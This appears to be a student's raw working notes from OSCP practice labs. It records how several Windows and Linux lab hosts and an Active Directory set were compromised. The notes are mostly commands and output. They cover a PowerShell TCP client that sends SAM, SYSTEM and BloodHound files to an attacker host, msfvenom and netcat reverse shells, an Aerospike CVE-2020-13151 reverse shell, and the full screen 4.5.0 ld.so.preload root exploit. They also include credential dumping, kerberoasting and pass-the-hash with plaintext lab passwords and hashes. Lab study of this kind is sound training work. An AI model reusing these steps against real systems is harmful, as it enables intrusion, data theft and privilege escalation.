#Impacket-psexec, wmiexec
>impacket-wmiexec -i 192.168.204.141 -u ashok -p 'iRGxv26fsPYH'           
>impacket-wmiexec oscp.exam/ashok:'iRGxv26fsPYH'@192.168.204.141
>impacket-psexec oscp.exam/ashok:'iRGxv26fsPYH'@192.168.204.141
>mpacket-psexec oscp.exam/ashok:iRGxv26fsPYH@192.168.204.141  
>impacket-wmiexec oscp.exam/ashok:iRGxv26fsPYH@192.168.204.141
>impacket-wmiexec ashok:iRGxv26fsPYH@192.168.204.141
[*] SMBv3.0 dialect used
[-] rpc_s_access_denied
>impacket-psexec ashok:iRGxv26fsPYH@192.168.204.141
[*] Requesting shares on 192.168.204.141.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'setup' is not writable.

>smbclient -L ////192.168.204.141 -U ashok                                   
Password for [WORKGROUP\ashok]:
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        setup           Disk 
No login with setup 
>iwr -uri http://192.168.45.220:8000/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
>.\PrintSpoofer64.exe -i -c powershell
#Got Admin Access

Mimicatz.exe
>celia.almeda: OSCP : e728ecbadfb02f51ce8eed753f3ff3fd

Serach files
>Get-ChildItem -Path C:\Users -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
>Get-ChildItem -Path C:\ -Include *.txt -File -Recurse -ErrorAction SilentlyContinue

Lateral Movement
#As Noticed that AD Network has only one proof.txt flag in DC01 Moving to Internal Network
>certutil.exe -urlcache -f http://192.168.45.220:8000/Lagent.exe agent.exe
>.\agent.exe -connect 192.168.45.220:11601 -ignore-cert

#Lateral Move - 10.10.154.140,142
Ping TTL value is 64 might be Kinux for both 10.10.154.140,142 both having SMB

140 - 593, 5985, 49675
142 - 5985, 47001 Nothing will hit web page in browser.

#SMB
>crackmapexec smb 10.10.154.142 -u '' -p ''
>crackmapexec smb 10.10.154.142 
>smbclient -L ////10.10.154.140
>smbclient -L ////10.10.154.142
>smbmap -H 10.10.154.140 -u '' -p '' 
smbmap -H 10.10.154.142 -u '' -p '' 

#SharpHound
>sudo service ssh start
>scp .\20240923122403_BloodHound.zip kali@192.168.45.220:/home/kali/HTB/OSCP/OSCPA
Shell not responding closed with ctrl+z or ctrl+c

Working
From Windows:   First start kali NC command
$client = New-Object System.Net.Sockets.TcpClient("192.168.45.220", 1234) 
$stream = $client.GetStream() 
[byte[]]$buffer = [System.IO.File]::ReadAllBytes("C:\Users\mary.williams\Desktop\20240923122403_BloodHound.zip")  
$stream.Write($buffer, 0, $buffer.Length) 
$stream.Close() 
$client.Close()

From Kali: 
nc -lvp 1234 > 20240923122403_BloodHound.zip

#3 accounts  Kerberoasting
SQL_SVC, web_SVC, KRBTGT
>.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
#Got SQL_SVC, web_SVC:

#Crackmapexec
>crackmapexec winrm 10.10.154.140 -u users.txt -p pass.txt
>crackmapexec winrm 10.10.154.142 -u users.txt -p pass.txt

MSSQL
>crackmapexec mssql 10.10.154.142 -u users.txt -p pass.txt
[+] oscp.exam\web_svc:Diamond1

reg save hklm\sam c:\sam
reg save hklm\system c:\system

>SYSTEM
$client = New-Object System.Net.Sockets.TcpClient("192.168.45.220", 1234) 
$stream = $client.GetStream() 
[byte[]]$buffer = [System.IO.File]::ReadAllBytes("C:\system") 
$stream.Write($buffer, 0, $buffer.Length) 
$stream.Close() 
$client.Close()

From Kali: 
nc -lvp 1234 > system

#SAM
$client = New-Object System.Net.Sockets.TcpClient("192.168.45.220", 1234) 
$stream = $client.GetStream() 
[byte[]]$buffer = [System.IO.File]::ReadAllBytes("C:\sam")  
$stream.Write($buffer, 0, $buffer.Length) 
$stream.Close() 
$client.Close()

From Kali: 
nc -lvp 1234 > sam
#SYSTEM & SAM
impacket-secretsdump -system system -sam sam local 
[*] Target system bootKey: 0xa5403534b0978445a2df2d30d19a7980
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3c4495bbd678fac8c9d218be4f2bbc7b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:11ba4cb6993d434d8dbba9ba45fd9011:::
Mary.Williams:1002:aad3b435b51404eeaad3b435b51404ee:9a3121977ee93af56ebd0ef4f527a35e:::
support:1003:aad3b435b51404eeaad3b435b51404ee:d9358122015c5b159574a88b3c0d2071:::
[*] Cleaning up...

#Login with Administrator for tunneling
>evil-winrm -i oscp.exam/192.168.210.141 -u administrator -H 3c4495bbd678fac8c9d218be4f2bbc7b (Not working)
>evil-winrm -i 192.168.210.141 -u administrator -H 3c4495bbd678fac8c9d218be4f2bbc7b #Hit

>evil-winrm -i oscp.exam/10.10.170.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd  (Not working)
>evil-winrm -i 10.10.170.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd  #Hit

10.10.170.142
>evil-winrm -i 10.10.170.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd  #Hit

In C drive has windows.old folder folder in that SAM, SYSTEM file C:\windows.old\windows\system32
#Privilege Escalation
impacket-secretsdump -system SYSTEM -sam SAM local
[*] Target system bootKey: 0x8bca2f7ad576c856d79b7111806b533d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
[*] Cleaning up...

10.10.170.140
>evil-winrm -i 10.10.170.140 -u tom_admin -H 4979d69d4ca66955c075c41cf45f24dc
>whoami /priv
# has SeImpersnate, SeBackup

#SeImpersnate
>upload /home/kali/HTB/OSCP/OSCPA/PrintSpoofer64.exe
*Evil-WinRM* PS C:\Users\tom_admin\Documents> .\PrintSpoofer64.exe -i -c powershell
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[!] CreateProcessAsUser() failed because of a missing privilege, retrying with CreateProcessWithTokenW().
[!] CreateProcessWithTokenW() isn't compatible with option -i

>upload /home/kali/HTB/OSCP/OSCPA/DeadPotato-NET4.exe

>.\DeadPotato-NET4.exe -newadmin ashok:QweAsdZxc!123

>evil-winrm -i 10.10.170.140 -u ashok -p 'QweAsdZxc!123'

#Dump SAM and SYSTEM 
>reg save hklm\sam c:\sam
>reg save hklm\system c:\system
>download sam
>download system

impacket-secretsdump -system system -sam sam local
[*] Target system bootKey: 0x2b19f40edaa944df28651c2086c8fb02
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:99e5e7f0e49260d9a7337758de610362:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up... 

>evil-winrm -i 10.10.170.142 -u administrator -H 99e5e7f0e49260d9a7337758de610362 
```

### OSCPA -1 - Standalone Linux aerospike

```jsx
192.168.211.143

Directories
>gobuster dir -u http://192.168.162.143/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
http://192.168.211.143/api/
http://192.168.211.143/assets/
http://192.168.211.143/config/
http://192.168.211.143/content/
http://192.168.211.143/plugins/
http://192.168.211.143/themes/
http://192.168.211.143/vendor/

>gobuster dir -u http://192.168.162.143/sub/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
http://192.168.162.143/sub/index/
http://192.168.162.143/sub/page/

#Hint
>gobuster dir -u http://192.168.162.143/api/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
http://192.168.162.143/api/heartbeat
{"serviceName":"mysql","status":"online"},
{"serviceName":"postgres","status":"online"},
{"serviceName":"aerospike","status":"online"},
{"serviceName":"OpenSSH","status":"online"}
#Nmap Results
3000/tcp open     ppp?
3001/tcp open     nessus?
3002/tcp filtered exlm-agent
3003/tcp open     cgms?
3004/tcp filtered csoftragent
3005/tcp filtered deslogin
Aerospike port 3000 is widely used in real-time bidding, fraud detection, recommendation engines, and profile management.

wget http://192.168.45.220:80/linpeas.sh
sh linpeas.sh

Aerospike
-Should download the poc.lua to work, match the version of aerospike, Install with (sudo pip3 install aerospike)
-Try with basic commands ls, pwd, whoami below example

>python3 cve2020-13151.py --ahost 192.168.162.143 --cmd "whoami" #aero
>>python3 cve2020-13151.py --ahost 192.168.162.143 --cmd "cat /home/aero/local.txt"
#once above command is working start woith reverse shell

>python3 cve2020-13151.py --ahost 192.168.162.143 --pythonshell --lport 3003 --lhost 192.168.45.220
>rlwrap nc -nlvp 3003

$ whoami
aero
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
bash: /root/.bashrc: Permission denied
aero@oscp:/$ 

#Sudo Version
Sudo version 1.8.31     

#Executing Linux Exploit Suggester
https://github.com/mzet-/linux-exploit-suggester                                                                                                                                                                                          

[+] [CVE-2022-2586] nft_object UAF
   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: probable
   Tags: [ ubuntu=(20.04) ]{kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-4034] PwnKit
   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit
   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2
   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE
   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154
   
   
#Privilege Escalation
   cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF

gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so... 
/tmp/rootshell
   
/usr/bin/screen-4.5.0 -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" 

#I did the same this with 41154, error `GLIBC_2.34' not found, trying to compile file libhax.c
HInt - For GLIBC error you can refer to this: https://github.com/X0RW3LL/XenSpawn

```

### OSCPA - 2 - Standalnone Linux

```jsx
192.168.218.144
http://192.168.218.144/.git/refs/heads/
>44a055daf7a0cd777f28f444c0d29ddf3ff08c54

Data In the folder read from the browser
0000000000000000000000000000000000000000 621a2e79b3a4a08bba12effe6331ff4513bad91a Stuart <luke@challenge.pwk> 1668808644 -0500	clone: from https://github.com/PWK-Challenge-Lab/dev.git
621a2e79b3a4a08bba12effe6331ff4513bad91a 44a055daf7a0cd777f28f444c0d29ddf3ff08c54 Stuart <luke@challenge.pwk> 1668808714 -0500	commit: Security Update

http://192.168.218.144/.git/refs/heads/main 44a055daf7a0cd777f28f444c0d29ddf3ff08c54

#HInt 
Dump the git repo
https://github.com/arthaud/git-dumper
>python3 git_dumper.py http://192.168.218.144/.git/ ./website
git log > git_output.txt
python3 process_git_commits.py

$username = "stuart@challenge.lab"; "dean@challenge.pwk";
$password = "BreakingBad92";

>ssh stuart@192.168.218.144 (BreakingBad92)

>uname -a 
Linux oscp 5.15.0-53-generic #59-Ubuntu SMP Mon Oct 17 18:53:30 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux

/opt/backup has 3 zip file sitebackup1.zip, sitebackup2.zip, sitebackup3.zip

#Zip file password crack 
>zip2john sitebackup3.zip > sitebackup3.hash
john -w=/home/kali/HTB/OSCP/rockyou.txt sitebackup3.hash
codeblue

in Unziped file has Joomla folder
Configuration.php

public $user = 'joomla';
public $password = 'Password@1';
public $db = 'jooml';
public $secret = 'Ee24zIK4cDhJHL4H';

ssh chloe@192.168.218.144 (Not worked with Password@1, Ee24zIK4cDhJHL4H)

Hint

In the shell (ssh stuart@192.168.218.144 (BreakingBad92))
su chloe (Ee24zIK4cDhJHL4H)
sudo su 
#Git root shell

```

### OSCPA - 3 - Standalnone WIndows

```jsx
192.168.249.145

By looing at the NMAP result has weird port 1978 unisql?  secrched the exploit in browser port 1978 unisql? bunch exploits may be try one by one.

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.220 LPORT=1234 -f exe > mouse1234.exe

>python3 49601.py 192.168.168.145 192.168.45.161 mouse1234.exe
#Error
Traceback (most recent call last):
  File "/home/kali/HTB/OSCP/OSCPB/49601.py", line 77, in <module>
    main()
  File "/home/kali/HTB/OSCP/OSCPB/49601.py", line 72, in main
    exploit()
  File "/home/kali/HTB/OSCP/OSCPB/49601.py", line 58, in exploit
    openCMD()
  File "/home/kali/HTB/OSCP/OSCPB/49601.py", line 44, in openCMD
    target.sendto("6f70656e66696c65202f432f57696e646f77732f53797374656d33322f636d642e6578650a".decode("hex"), (rhost,port)) # openfile /C/Windows/System32/cmd.exe
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
AttributeError: 'str' object has no attribute 'decode'. Did you mean: 'encode'?

>python3 50972.py 192.168.218.145 192.168.45.220 mouse1234.exe
#Got Initial shell with offsec user
python3 -m http.server 80
iwr -uri 192.168.45.220/winPEASx64.exe -Outfile winPEAS.exe
iwr -uri 192.168.45.220/nc.exe -Outfile nc.exe

.\nc.exe 192.168.45.161 1234 -e powershell.exe
rlwrap nc -nlvp 1234

.\winPEAS.exe > 145_winPEAS.txt

cve-2020-1013
>.\WSuspicious.exe /command:"" - accepteula - s - d cmd / c """"echo 1 > C:\\wsuspicious.txt"""""" /autoinstall
>./wsuxploit.sh 192.168.168.145 192.168.45.161 80 mouse1234.exe 
>rlwrap nc -nlvp 1234
 
 no success for both
 
 
 
 #winPEAS
 
Version: NetNTLMv2
  Hash:    offsec::OSCP:1122334455667788:1365ed26489f281d136fc9f7b4795875:0101000000000000b565fa429012db01a4bb5784fe0bf9a2000000000800300030000000000000000000000000200000f0bf20cc6300de3a0571050aa5fa99a69c0e1124c8c6010acc4c8c0efc07bef40a00100000000000000000000000000000000000090000000000000000000000 

Looking for possible password files in users homes
 https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
    C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
    C:\Users\offsec\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt

 \C:\Program Files (x86)\Mouse Server\MouseServer.exe
 
 Searching executable files in non-default folders with write (equivalent) permissions (can be slow)
     File Permissions "C:\Users\offsec\AppData\Local\Microsoft\WindowsApps\winget.exe": offsec [AllAccess]
     File Permissions "C:\Users\offsec\AppData\Local\Microsoft\WindowsApps\Skype.exe": offsec [AllAccess]
     File Permissions "C:\Users\offsec\AppData\Local\Microsoft\WindowsApps\python3.exe": offsec [AllAccess]
     File Permissions "C:\Users\offsec\AppData\Local\Microsoft\WindowsApps\python.exe": offsec [AllAccess]
     File Permissions "C:\Users\offsec\AppData\Local\Microsoft\WindowsApps\MicrosoftEdge.exe": offsec [AllAccess]
     File Permissions "C:\Users\offsec\AppData\Local\Microsoft\WindowsApps\GameBarElevatedFT_Alias.exe": offsec [AllAccess]
     File Permissions "C:\Users\offsec\AppData\Local\Microsoft\WindowsApps\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\GameBarElevatedFT_Alias.exe": offsec [AllAccess]
     File Permissions "C:\Users\offsec\AppData\Local\Microsoft\WindowsApps\Microsoft.SkypeApp_kzf8qxf38zg5c\Skype.exe": offsec [AllAccess]
     File Permissions "C:\Users\offsec\AppData\Local\Microsoft\WindowsApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdge.exe": offsec [AllAccess]
     File Permissions "C:\Users\offsec\AppData\Local\Microsoft\WindowsApps\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\winget.exe": offsec [AllAccess]
     File Permissions "C:\Users\offsec\AppData\Local\Microsoft\WindowsApps\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\python3.exe": offsec [AllAccess]
     File Permissions "C:\Users\offsec\AppData\Local\Microsoft\WindowsApps\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\python.exe": offsec [AllAccess]
     File Permissions "C:\Users\offsec\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe": offsec [AllAccess]
     File Permissions "C:\Users\offsec\AppData\Local\Microsoft\OneDrive\OneDrive.exe": offsec [AllAccess]
     File Permissions "C:\Users\offsec\AppData\Local\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe": offsec [AllAccess]
     
#Hint
Some said about Installed App in Windows, then it's related SSH Service (Not Mouse Server) then menioned PuTTY

#Some Credentials
RegKey Name: zachary
    RegKey Value: "&('C:\Program Files\PuTTY\plink.exe') -pw 'Th3R@tC@tch3r' zachary@10.51.21.12 'df -h'"
    
>xfreerdp /u:zachary /p:'Th3R@tC@tch3r' /v:192.168.218.145 /smart-sizing:1920x1080 /cert-ignore

Dumping the Hashes
reg save hklm\sam c:\sam
reg save hklm\system c:\system

scp .\sam kali@192.168.45.220:/home/kali/HTB/OSCP/OSCPA
scp .\system kali@192.168.45.220:/home/kali/HTB/OSCP/OSCPA

impacket-secretsdump -system system -sam sam local
[*] Target system bootKey: 0xefda5d42d4fb516149119632d1dd0320
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:dd9f8b3d513cdcd207cd34ec76d8f8c9:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:329c4c51e208b151ffe2f002a100a6de:::
zachary:1001:aad3b435b51404eeaad3b435b51404ee:df3ebca610f20efee074e8098d555471:::
offsec:1002:aad3b435b51404eeaad3b435b51404ee:bc60cffce47a782bef58e915ca7cc3a9:::
[*] Cleaning up..

```

# OSCPB

### AD - web , ssh tunnel, impacket-mssqlclient

```jsx
Nmap Results
21/tcp    open  ftp           Microsoft ftpd
22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open  http          Microsoft IIS httpd 10.0
8080/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8443/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=MS01.oscp.exam
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC

SItes
http://192.168.193.147:8000/
https://ms01.oscp.exam:8443/

SMB Enumeration
crackmapexec smb 192.168.193.147			# NO info
crackmapexec smb 192.168.193.147 -u '' -p ''             #(name:MS01) (domain:oscp.exam) oscp.exam\: STATUS_ACCESS_DENIED 

smbclient -L //192.168.193.147 
smbclient -L ////192.168.193.147 
smbclient -L //192.168.193.147 -U '' -P '' 
smbclient -L //192.168.193.147 -U '' 

smbmap -H 192.168.193.147
smbmap -H 192.168.193.147 -u '' 
smbmap -H 192.168.193.147 -u '' -p ''
smbmap -H 192.168.193.147 -u '' -p '' -d oscp.exam

rpcclient -N 192.168.193.147
rpcclient -N 192.168.193.147 -U ''
rpcclient -N 192.168.193.147 -U '' -P ‘’

HTTP Enumeration
http://192.168.193.147:8000/ - Windows Server
https://ms01.oscp.exam:8443/ Some form for filling look for potential entry points

#No success with that  gobuster dir -u http://192.168.193.147:8443/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt 

#UNC Path
curl -T test.txt http://192.168.193.147:8000/test.txt 
# Accessing
https://ms01.oscp.exam:8443/test.txt    #404
http://192.168.193.147:8000/test.txt       #404

> msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.220 LPORT=1234 -f aspx > rev1234.aspx

Statred >impacket-smbserver share share -smb2support

#Browser
https://ms01.oscp.exam:8443/ in the url field \\192.168.45.220\test.txt, got web_svc.
web_svc::OSCP:aaaaaaaaaaaaaaaa:16ce5565d9c3e131ce467eaaaaaf643a:010100000000000000960303dc18db0159e69079217a525d000000000100100058006c0059006c006d004f00510075000300100058006c0059006c006d004f0051007500020010004400680046004c00480073007a004b00040010004400680046004c00480073007a004b000700080000960303dc18db01060004000200000008003000300000000000000000000000003000002412bd971f9d6250d5b686b6b39062a14d39387aa314a26802af55dd8f751efd0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003200320030000000000000000000

>hashid "web_svc::OSCP:aaaaaaaaaaaaaaaa:16ce5565d9c3e131ce467eaaaaaf643a:010100000000000000960303dc18db0159e69079217a525d000000000100100058006c0059006c006d004f00510075000300100058006c0059006c006d004f0051007500020010004400680046004c00480073007a004b00040010004400680046004c00480073007a004b000700080000960303dc18db01060004000200000008003000300000000000000000000000003000002412bd971f9d6250d5b686b6b39062a14d39387aa314a26802af55dd8f751efd0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003200320030000000000000000000"
#NetNTLMv2 

hashcat -m 5600 web_svc147.hash /home/kali/HTB/OSCP/rockyou.txt (Diamond1)

ssh web_svc@192.168.193.147 (DIamond1)
#Got Shell
iwr -uri http://192.168.45.220/winPEASx64.exe -OutFile winPEAS.exe   
iwr -uri http://192.168.45.220/SharpHound.exe -OutFile SharpHound.exe
.\SharpHound.exe
.\winPEAS.exe > 147winPEAS.txt

Transfered through ssh
kali>sudo systemctl start ssh
win>scp .\20241007104052_BloodHound.zip kali@192.168.45.220:/home/kali/HTB/OSCP/OSCPB
win>scp .\147winPEAS.txt kali@192.168.45.220:/home/kali/HTB/OSCP/OSCPB

From the Bloodhound 
Kerberoastable Users - web_svc, sql_svc, krbtgt

iwr -uri http://192.168.45.220/Rubeus.exe -OutFile Rubeus.exe
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
Got hashes of sql_svc ms02, web_svc ms01
$krb5tgs$23$*sql_svc$oscp.exam$MSSQL/MS02.oscp.exam@oscp.exam*$8C9D771CFFAFAFFB55F1A0491A2151C5$7B3037263C5F19EA1F699EE9C80F47474DFCA6427D3D7F087636D156B8CB3C8208E404901E49B5AD4C22B825CC88A3ADA473CDEA59C316C74F66CA635D6E1B42D1B97590D82E
FF642F69AAB6C1DFEAC5DC78F36A8274C1ED0B0F55BCE902DC5679B85DFEE13B764FD12EBE84B67E3ECDF0CA96445B5E5B749FE470CD003D3C5790C246170B0AB98F61A2B737EC469335E9EE8A2118585C977EA55732DC4B7DFAB42656A04EEB41ACABC95A297722BE1B084D27197943E6DD1ED109B13FFFA6FBB5E283E74E6EA92A25225BF74EE33BAC4FB9078337562E62577FF12C29DC3E2FFC9FE7BDED17E17ED6033AE49C7063841CE2E6C447CB71E71D644F1F419A97FDC0A169CABC74226B9A2694439B59106BCAE5226A8C6D6A0CCB391347F08E3A69BA5935EC6C91B4C46059AA80D964233956D2E94C07C33696EA05614EA59A47FB8CFE13D4C80891D7BBC3C0098B1F1762448ADE633F3F75FD59FE01ADA1978CCC7AECFB339BF7B8AE7548F6FEA881B8EE4C2EF3305D85FB801502D013B470DC289402F3D834F6E1AED88CBE2B23CE51CE5EBC467EE15851D969DCBD31B65A885F79BBD286B0039E0883DC1A0BF414178E8174C84E44228B82C8F98461941ACA82AA266E01D1EAF18971CC62073AF43F2FD1C5817F2A7D9CCC4EFE0294A4802453024346342F6FCF601E8C84DE6BE47B7C09B63A226F9E938469A7EFEEBD070438E38917EE75E6F5DFC1B55590D20FE8259027CCBB09C7D3DEB5D30C3EE72C957029C55F0252016D3E399068C22DBBB6DD75F830CB07F6E65D61A39EA9A5193506B53102046A55FA24A64A288ECCB67C1C226DD6617719F42673B2E01A816BFDDAC35BEFB3C571C41A0CA559B09FEBA29C64D65E9206B03F068A867BE8BD396390B8E080A4F367E0350F20E64F61C7DC68E3402039A1D8AE933CD3453A90FADD27B6146CC92AAB43DACDFF63FE931A55A41CA56E0118E7B1F3E865D2B233E1D010E81FEE0C2086FD9D72C071AD741800DEE8F8159588D315DF8FF675173C0E70332134A56D7991F0A54FA1590D891C80E9A1818563EDC7501EF34CC6FD19CED204D859E1CC437988F9BF8017E58ED0743A951D3C47FDF4CB889D48AB2CD54C7B464857B555CC4A7994A36B1F9AF421DBCC1D26BECBD9C5C74869D24AE875DAC10A189E7AC8356F16BAF23354F55AB7ADEE9F6A9B45563D7CB3AD81D2AE058C9CD7A0B952BA1C54BB58B72B8D700C0B3F1D9C059AEF821A7DF009734B6A477FF6E83DEC5AECACF2A872BD47A028435BB08509F7136C4B18A110F2ACAF6EC490E2142DD456BBD0586D8173EA9EF4E06E0DD8EFD5209E99B89770D6BE29D91E34EB2BECB4385ABD06592898088DD8BDE1C4B8A713C64C6FF68BC4A33874E2123E3887C92156D0CD54DDDDE719A4CF5DA6229CDCF79D42D78349648D9C01EDC14D2FFEBF69A425A55287FE049233E72E30B1394F70D6288ACF5E28F41DB4FC008FB471C208458754087242B2ED2D27B6DD92DC5C33A5FD8899DA83CC6669CD11B9E83EA80815478C143842ABC8E0

In the Discord chat error with rubeus.exe try with impacket-GetUserSPNs
impacket-GetUserSPNs -dc-ip 192.168.193.147 oscp.exam/web_svc:Diamond1 -request
impacket-GetNPUsers -dc-ip 192.168.193.147 oscp.exam/web_svc:Diamond1 -request

Try internal IP connect using Ligolo-NG
